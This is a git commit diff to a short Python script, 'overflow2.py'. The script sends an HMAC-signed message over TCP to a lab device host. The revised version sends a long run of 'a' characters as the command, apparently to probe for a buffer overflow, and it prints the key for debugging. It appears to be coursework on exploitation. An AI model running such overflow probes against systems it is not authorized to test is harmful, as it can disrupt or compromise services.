bf0e5b1ddeea9d68066353e3fc0e98a4a4240229
Olli Glorioso <84347872+olliglorioso@users.noreply.github.com>
2024-10-08 18:57:39 +0000

    recreated working version to overflow2

--- overflow2.py
+++ overflow2.py
@@ -4,10 +4,10 @@ import hashlib
 
 usernro = '552210'
 target_ip = 'device1.vikaa.fi'
-port = 33578
-secret_key = b'your_secret_key_here'  # Replace with the actual key
+port = 33578  # Ensure this is the correct port number
 
 def generate_hmac(message, key):
+    print(message)
     hmac_obj = hmac.new(key, message.encode(), hashlib.sha256)
     return hmac_obj.hexdigest()
 
@@ -16,17 +16,19 @@ def send_msg(commando, secret_key):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         s.connect((target_ip, port))
-        hmac_input = f'ClientCmd;{usernro};{commando}'
+        hmac_input = f'ClientCmd|{usernro}|{commando}'
         hmac1 = generate_hmac(hmac_input, secret_key)
-        full_message = f'{usernro};{commando};{hmac1}'
-        print(full_message)
-        s.sendall(full_message.encode())
-        data = s.recv(1024)
-        print("Received:", data.decode())
+        message = f'{usernro};{commando};{hmac1}\n'
+        print(secret_key)
+        s.sendall(message.encode()) 
+        data = s.recv(1024) 
+        print(data.decode())
     finally:
-        # Always close the socket after the transaction
         s.close()
         print("Connection closed")
 
-# Example usage
-send_msg("moi", secret_key)
+def gen_as(x): 
+    return 'a' * x
+
+key = gen_as(20)
+send_msg(gen_as(51), f"{key}".encode())
